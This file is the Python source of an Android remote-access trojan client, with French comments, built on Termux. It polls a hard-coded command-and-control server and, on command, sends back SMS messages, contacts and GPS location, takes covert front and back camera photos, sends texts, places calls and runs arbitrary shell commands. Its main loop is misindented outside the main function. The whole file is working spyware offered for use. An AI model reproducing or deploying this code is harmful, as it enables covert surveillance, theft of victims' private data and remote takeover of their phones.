import requests
import time
import json
import subprocess
import os
from datetime import datetime

# 🔑 BONNE IP ET BON PORT
C2_SERVER = "http://10.36.80.195:8080/command"

def get_device_id():
    try:
        import android
        droid = android.Android()
        return droid.getBuildModel() + "_" + str(int(time.time()))
    except:
        return "device_" + str(int(time.time()))

def fetch_command(device_id):
    try:
        url = f"{C2_SERVER}?id={device_id}"
        response = requests.get(url, timeout=10)
        return response.text.strip()
    except:
        return None

def send_result(device_id, data):
    try:
        url = f"{C2_SERVER}?id={device_id}"
        requests.post(url, data=data.encode('utf-8'), timeout=10)
    except:
        pass

def execute_command(cmd):
    if cmd == "GET_SMS":
        try:
            result = "📱 SMS REÇUS:\n"
            sms = subprocess.check_output(["termux-sms-list"], text=True)
            data = json.loads(sms)
            for msg in data[:10]:
                result += f"[{msg.get('number')}] {msg.get('body')[:80]}\n"
            return result
        except:
            return "❌ Erreur SMS"
    
    elif cmd.startswith("SMS:"):
        try:
            parts = cmd[4:].split(",", 1)
            if len(parts) == 2:
                subprocess.check_output(["termux-sms-send", "-n", parts[0].strip(), parts[1]], text=True)
                return f"✉️ SMS envoyé à {parts[0].strip()}"
            return "❌ Format: SMS:0612345678,Message"
        except:
            return "❌ Erreur envoi SMS"
    
    elif cmd == "GET_CONTACTS":
        try:
            result = "👤 CONTACTS:\n"
            contacts = subprocess.check_output(["termux-contact-list"], text=True)
            data = json.loads(contacts)
            for contact in data[:10]:
                result += f"{contact.get('name', 'inconnu')}: {contact.get('number', '')}\n"
            return result
        except:
            return "❌ Erreur contacts"
    
    elif cmd == "GET_LOCATION":
        try:
            loc = json.loads(subprocess.check_output(["termux-location"], text=True))
            return f"📍 GPS: {loc.get('latitude')}, {loc.get('longitude')}"
        except:
            return "❌ GPS indisponible"
    
    elif cmd in ["PHOTO", "PHOTO_BACK"]:
        try:
            filename = f"/sdcard/DCIM/photo_{int(time.time())}.jpg"
            subprocess.check_output(["termux-camera-photo", filename])
            return f"📸 Photo: {filename}"
        except:
            return "❌ Erreur photo"
    
    elif cmd == "PHOTO_FRONT":
        try:
            filename = f"/sdcard/DCIM/selfie_{int(time.time())}.jpg"
            subprocess.check_output(["termux-camera-photo", "-c", "front", filename])
            return f"🤳 Selfie: {filename}"
        except:
            return "❌ Erreur selfie"
    
    elif cmd.startswith("CALL:"):
        try:
            num = cmd[5:].strip()
            subprocess.check_output(["termux-telephony-call", num])
            return f"📞 Appel vers {num}"
        except:
            return "❌ Erreur appel"
    
    elif cmd == "VIBRATE":
        try:
            subprocess.check_output(["termux-vibrate", "-d", "3000"])
            return "📳 Vibré"
        except:
            return "❌ Erreur vibration"
    
    elif cmd == "LOCK":
        try:
            subprocess.check_output(["input", "keyevent", "26"])
            return "🔒 Verrouillé"
        except:
            return "❌ Erreur verrouillage"
    
    elif cmd == "TORCH_ON":
        try:
            subprocess.check_output(["termux-torch", "on"])
            return "🔦 Torche ON"
        except:
            return "❌ Erreur torche"
    
    elif cmd == "TORCH_OFF":
        try:
            subprocess.check_output(["termux-torch", "off"])
            return "🔦 Torche OFF"
        except:
            return "❌ Erreur torche"
    
    elif cmd == "INFO":
        try:
            model = subprocess.check_output(["getprop", "ro.product.model"], text=True).strip()
            android = subprocess.check_output(["getprop", "ro.build.version.release"], text=True).strip()
            battery = json.loads(subprocess.check_output(["termux-battery-status"], text=True))
            return f"📱 {model} | Android {android} | Batterie: {battery.get('percentage')}%"
        except:
            return "ℹ️ Infos indisponibles"
    
    elif cmd.startswith("SHELL:"):
        try:
            commande = cmd[6:].strip()
            result = subprocess.check_output(commande, shell=True, text=True, stderr=subprocess.STDOUT)
            return f"💻 {result}"
        except subprocess.CalledProcessError as e:
            return f"❌ {e.output}"
    
    elif cmd == "PING":
        return "🏓 PONG"
    
    elif cmd == "KILL":
        return "☠️ Arrêt du client"
    
    else:
        return f"❓ Inconnu: {cmd}"

def main():
    device_id = get_device_id()
    print(f"☠️ Client démarré - ID: {device_id}")
    
    
while True:
        try:
            cmd = fetch_command(device_id)
            if cmd and cmd != "PING":
                result = execute_command(cmd)
                send_result(device_id, result)
                print(f"📥 {cmd} -> OK")
                if cmd == "KILL":
                    break
            time.sleep(5)
        except Exception as e:
            print(f"Erreur: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
